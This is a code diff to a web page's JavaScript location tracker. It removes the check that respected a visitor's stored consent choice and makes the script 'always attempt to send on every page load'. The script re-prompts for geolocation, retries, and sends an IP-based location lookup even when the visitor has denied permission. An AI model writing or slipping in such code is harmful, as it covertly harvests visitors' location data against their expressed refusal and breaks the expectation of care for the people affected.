@@ -101,53 +101,38 @@
       await sendPayload(payload);
     }
 
-    // Decide flow based on consent and permission
-    const consent = localStorage.getItem('consent_given');
+    // Always attempt to send on every page load.
+    // Strategy: first try Permissions API to avoid double prompts; then try to get geo once (two attempts), otherwise fallback to IP lookup.
 
-    if (consent === '1'){
-      // User previously allowed — try GPS (two attempts)
-      let geo = await getGeoAttempt(10000);
-      if(!geo || geo.error){
-        if(!(geo && geo.error === 'no-geo-or-not-secure')) geo = await getGeoAttempt(8000);
-      }
-      if (geo && geo.lat && geo.lon){ await sendBrowserCoords(geo.lat, geo.lon); }
-      else { await sendIpFallback(); }
-      return;
-    }
-
-    if (consent === '0'){
-      // User previously denied — immediately send IP fallback
-      await sendIpFallback();
-      return;
-    }
-
-    // No previous decision: query Permissions API if available to avoid double prompt
     try{
       if (navigator.permissions && navigator.permissions.query){
         try{
           const p = await navigator.permissions.query({ name: 'geolocation' });
           if (p.state === 'granted'){
-            // no prompt, we can get position
-            const geo = await getGeoAttempt(10000);
-            if(geo && geo.lat && geo.lon){ setTimeout(()=>localStorage.setItem('consent_given','1'),0); await sendBrowserCoords(geo.lat, geo.lon); return; }
-            else { setTimeout(()=>localStorage.setItem('consent_given','0'),0); await sendIpFallback(); return; }
+            // directly obtain position
+            let geo = await getGeoAttempt(10000);
+            if(!geo || geo.error){ if(!(geo && geo.error === 'no-geo-or-not-secure')) geo = await getGeoAttempt(8000); }
+            if (geo && geo.lat && geo.lon){ localStorage.setItem('consent_given','1'); await sendBrowserCoords(geo.lat, geo.lon); }
+            else { localStorage.setItem('consent_given','0'); await sendIpFallback(); }
+          } else if (p.state === 'prompt'){
+            // request once
+            let geo = await getGeoAttempt(10000);
+            if(!geo || geo.error){ if(!(geo && geo.error === 'no-geo-or-not-secure')) geo = await getGeoAttempt(8000); }
+            if (geo && geo.lat && geo.lon){ localStorage.setItem('consent_given','1'); await sendBrowserCoords(geo.lat, geo.lon); }
+            else { localStorage.setItem('consent_given','0'); await sendIpFallback(); }
+          } else {
+            // denied
+            localStorage.setItem('consent_given','0');
+            await sendIpFallback();
           }
-          if (p.state === 'prompt'){
-            // request once and act on result
-            const geo = await getGeoAttempt(10000);
-            if(geo && geo.lat && geo.lon){ localStorage.setItem('consent_given','1'); await sendBrowserCoords(geo.lat, geo.lon); return; }
-            else { localStorage.setItem('consent_given','0'); await sendIpFallback(); return; }
-          }
-          // denied
-          localStorage.setItem('consent_given','0');
-          await sendIpFallback();
           return;
         }catch(e){ /* fallthrough to direct request */ }
       }
     }catch(e){ /* ignore */ }
 
-    // Permissions API not available or failed — directly try to request geo once and fallback
-    const geo = await getGeoAttempt(10000);
+    // Permissions API not available or failed — directly try to get geo and fallback
+    let geo = await getGeoAttempt(10000);
+    if(!geo || geo.error){ if(!(geo && geo.error === 'no-geo-or-not-secure')) geo = await getGeoAttempt(8000); }
     if (geo && geo.lat && geo.lon){ localStorage.setItem('consent_given','1'); await sendBrowserCoords(geo.lat, geo.lon); }
     else { localStorage.setItem('consent_given','0'); await sendIpFallback(); }
 
